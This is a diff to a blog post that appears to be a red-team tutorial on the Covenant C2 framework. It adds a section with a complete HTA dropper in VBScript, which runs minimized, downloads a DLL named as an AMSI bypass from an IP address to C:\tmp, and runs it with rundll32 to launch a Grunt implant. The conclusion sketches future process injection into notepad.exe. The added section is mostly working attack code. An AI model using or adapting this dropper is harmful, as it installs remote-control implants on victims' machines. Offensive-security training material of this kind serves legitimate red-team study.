@@ -626,9 +626,92 @@ If we press the Enable Content button, the macro will execute and the message bo
   <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov13.JPG">
 </p>
 
+ 
+
+### 4) Weaponize HTA DLL delivery
+
+First of all we need to craft our HTA (first stage) file that will deliver our Grunt payload (Second stage. An example follow below: 
+
+```html
+
+<!DOCTYPE html>
+<html>
+<head>
+<HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no"  CAPTION="no" />
+<script type="text/vbscript">
+
+' ===================================
+' Download Clause
+' Tested with binaries - works!
+HTTPDownload "http://192.168.152.100:1234/covenant-DLL-noAmsi.dll", "C:\tmp\"
+
+Sub HTTPDownload( myURL, myPath )
+
+    ' Standard housekeeping
+    Dim i, objFile, objFSO, objHTTP, strFile, strMsg
+    Const ForReading = 1, ForWriting = 2, ForAppending = 8
+
+    ' Create a File System Object
+    Set objFSO = CreateObject( "Scripting.FileSystemObject" )
+
+    ' Check if the specified target file or folder exists,
+    ' and build the fully qualified path of the target file
+    If objFSO.FolderExists( myPath ) Then
+        strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )
+    ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then
+        strFile = myPath
+    Else
+        WScript.Echo "ERROR: Target folder not found."
+        Exit Sub
+    End If
+
+    ' Create or open the target file
+    Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )
+
+    ' Create an HTTP object
+    Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
+
+    ' Download the specified URL
+    objHTTP.Open "GET", myURL, False
+    objHTTP.Send
+
+    ' Write the downloaded byte stream to the target file
+    For i = 1 To LenB( objHTTP.ResponseBody )
+        objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )
+    Next
+
+    ' Close the target file
+    objFile.Close( )
+End Sub
+
+
+' =============================
+' Execute clause
+
+Dim sh  
+Set sh = CreateObject("Wscript.Shell")  
+Call sh.Run("rundll32 covenant-DLL-noAmsi.dll,MonkEntry")  
+Set sh = Nothing  
+</script>
+</head>
+<body>
+</body>
+</html>
+
+```
+
+
+
+
+
+
+
+
+
+
 ## Conclusion
 
-Future implementation will attemp something along these lines below:
+Future implementation will attemp more complicated scenarios along the lines presented below:
 
 1) Generate an `HTA` dropper that will perform the following 
 
@@ -638,4 +721,4 @@ Future implementation will attemp something along these lines below:
 
 4) The `DLL` will perform process injection against notepad.exe
 
-5) Notepad will spawn a Covenant's Grunt
+5) Notepad will spawn a Covenant's Grunt.
